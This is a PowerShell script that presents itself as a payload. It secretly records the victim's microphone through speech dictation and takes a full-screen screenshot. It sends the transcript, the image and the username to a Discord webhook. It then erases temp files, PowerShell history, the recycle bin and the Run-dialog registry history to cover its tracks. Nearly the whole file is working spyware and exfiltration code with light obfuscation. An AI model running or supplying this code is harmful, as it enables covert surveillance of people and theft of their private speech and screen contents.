$Y =($env:tmp);
$U = whoami;

function DC-Upload {

	[CmdletBinding()]
	param (
    		[parameter(Position=0,Mandatory=$False)]
   		[string]$file,
    		[parameter(Position=1,Mandatory=$False)]
    		[string]$text 
		)

	# $dc = 'YOUR DISCORD WEBHOOK GOES HERE IF YOU HOST YOUR OWN VERSION OF THIS PAYLOAD'

	$Body = @{
	  'username' = $env:username
	  'content' = $text
	}

	if (-not ([string]::IsNullOrEmpty($text))){Invoke-RestMethod -ContentType 'Application/Json' -Uri $dc  -Method Post -Body ($Body | ConvertTo-Json)};
	if (-not ([string]::IsNullOrEmpty($file))){curl.exe -F "file1=@$file" $hookurl}
}

function voiceLogger {

    Add-Type -AssemblyName System.Speech
    $recognizer = New-Object System.Speech.Recognition.SpeechRecognitionEngine
    $grammar = New-Object System.Speech.Recognition.DictationGrammar
    $recognizer.LoadGrammar($grammar)
    $recognizer.SetInputToDefaultAudioDevice()

    while ($true) {
        $result = $recognizer.Recognize()
        if ($result) {
            $results = $result.Text
            Write-Output $results
            $log = "$env:tmp/VoiceLog.txt"
            echo $results > $log
            $text = get-content $log -raw
            DC-Upload $text

            # Use a switch statement with the $results variable
            switch -regex ($results) {
                '\bnote\b' {saps notepad}
                '\bexit\b' {break}
            }
        }
    }
    Clear-Content -Path $log
}

    function Screenshot {

    $Date =((get-date).ToString('yyMMddHHmmss'));
    $global:Name = "Screenshot" + $Date;
    Add-Type -AssemblyName *m.*s.F*s;
    Add-type -AssemblyName *m.Dr*g;
    $S = [System.Windows.Forms.SystemInformation]::VirtualScreen;
    $W = $S.Width;
    $H = $S.Height;
    $F = $S.Left;
    $T = $S.Top;
    $B = New-Object System.Drawing.Bitmap $W, $H;
    $G = [System.Drawing.Graphics]::FromImage($B);
    $G.CopyFromScreen($F, $T, 0, 0, $B.Size);
    $B.Save($Y+"\" +$Name + ".png");Start-Sleep 3;
    $global:Path = ($Y + "\" +$Name + ".png");
    }

function Clean-Exfil { 

rm $env:TEMP\* -r -Force -ErrorAction SilentlyContinue

Remove-Item (Get-PSreadlineOption).HistorySavePath

Clear-RecycleBin -Force -ErrorAction SilentlyContinue

reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f

}

voiceLogger;
Start-Sleep 2;
Screenshot;
Start-Sleep 2;
DC-Upload -file $Path -text $U"\"$Name;
Start-Sleep 2;
Clean-Exfil     